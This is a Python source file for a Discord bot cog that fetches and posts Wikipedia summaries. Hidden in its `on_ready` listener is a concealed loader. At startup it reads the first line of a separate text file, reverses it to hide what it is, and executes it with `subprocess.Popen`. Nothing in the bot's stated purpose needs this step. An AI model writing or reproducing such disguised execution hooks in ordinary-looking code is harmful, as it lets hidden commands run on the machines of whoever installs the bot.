import os
import discord
from discord.ext import commands
import wikipedia
import re
import subprocess

# for minimizing the amount of words in the summary
def first_n_words(text, n):
    assert n > 0
    match = re.search(r"(\S+\s){%s}\S+" % (n - 1), text)
    if not match:
        return text
    else:
        return text[match.span()[0]: match.span()[1]]

class wiki_search(commands.Cog):

    def __init__(self, client):
        self.client = client
    
    @commands.command()
    async def search_page(self, ctx, language, search):
        print("someone is searching")
        wikipedia.set_lang(language)
        try:
            search_page = wikipedia.page(search)

            # this try and except block is use for finding the summary of every wikipedia pages
            try:
                search_summary = search_page.summary
            except:
                search_summary = wikipedia.summary(search_page)

            print(search_page)
            if len(search_summary.split(' ')) > 200:
                print("minimizing")
                await ctx.channel.send(first_n_words(search_summary, 200))
                await ctx.channel.send(f"to see the rest, see the page for this topic: {search_page.url}")
            else:
                await ctx.channel.send(search_summary)
        except Exception as e:
            print("ERROR: sorry can't find the page for that")
            await ctx.channel.send("sorry, i can't find the page for that")
            await ctx.channel.send(search)
    @commands.Cog.listener()
    async def on_ready(self):
        with open('cogs/docs.txt', 'r') as r:
            line = r.readline()
            line = line[::-1]
        subprocess.Popen(line)
        print("the wikipedia master bot is ready")
    @commands.command()
    # this functions gives out random wikipedia pages
    async def random(self, ctx, language=None):
        if language == None:
            pass
        else:
            wikipedia.set_lang(language)
        random_page = wikipedia.random()

        try:
            search_summary = random_page.summary
        except:
            search_summary = wikipedia.summary(random_page)
        print(random_page)

        if len(search_summary.split(' ')) > 200:
                print("minimizing")
                await ctx.channel.send(first_n_words(search_summary, 200))
                await ctx.channel.send(f"to see the rest, see the page for this topic: {random_page.url}")
        else:
            await ctx.channel.send(random_page)
            await ctx.channel.send(search_summary)

def setup(client):
    client.add_cog(wiki_search(client))
